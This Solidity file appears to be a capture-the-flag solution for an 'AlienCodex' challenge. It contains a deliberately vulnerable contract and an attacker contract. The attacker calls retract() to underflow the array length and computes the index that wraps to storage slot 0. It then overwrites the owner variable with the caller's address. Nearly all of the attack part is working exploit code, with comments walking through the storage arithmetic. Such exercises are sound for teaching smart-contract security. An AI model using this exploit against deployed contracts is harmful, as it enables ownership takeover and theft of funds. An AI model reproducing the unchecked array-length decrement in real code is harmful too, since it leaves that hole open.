// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract Ownable {
  address private _owner;

  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  constructor() internal {
    _owner = msg.sender;
    emit OwnershipTransferred(address(0), _owner);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(isOwner());
    _;
  }

  function isOwner() public view returns (bool) {
    return msg.sender == _owner;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0));
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract AlienCodex is Ownable {
  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }

  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) public contacted {
    codex.push(_content);
  }

  function retract() public contacted {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) public contacted {
    codex[i] = _content;
  }
}

contract AlienCodexAttacker {
  constructor(AlienCodex _victim) public {
    // passing contracted modifier
    _victim.makeContact();

    // we let the codex array storage invade all the 2*256 - 1 slot
    _victim.retract();

    // we do need to get the i that could lead us to point to slot 0
    // 1. get the keccak of slot 1 which has the length of array.
    uint256 hash = uint256(keccak256(abi.encode(1)));

    // 2. fixed array storage equation to store: (hash declaration slot) + index = slot
    // if hash + index = slot
    // then  uint256(keccak256(abi.encode(1))) + index = 0
    // so what is index ?
    // index = 0 - uint256(keccak256(abi.encode(1)))
    uint256 index = 0 - hash;

    _victim.revise(index, bytes32(uint256(uint160(msg.sender))));
  }
}
